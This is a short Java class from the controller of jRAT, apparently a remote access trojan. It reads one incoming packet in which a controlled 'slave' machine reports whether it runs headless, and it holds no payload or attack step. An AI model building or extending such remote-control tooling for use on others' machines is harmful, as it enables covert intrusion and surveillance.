package io.jrat.controller.packets.incoming;

import io.jrat.controller.Slave;
import java.io.DataInputStream;

public class Packet20Headless extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		boolean headless = dis.readBoolean();

		slave.setHeadless(headless);
	}
}
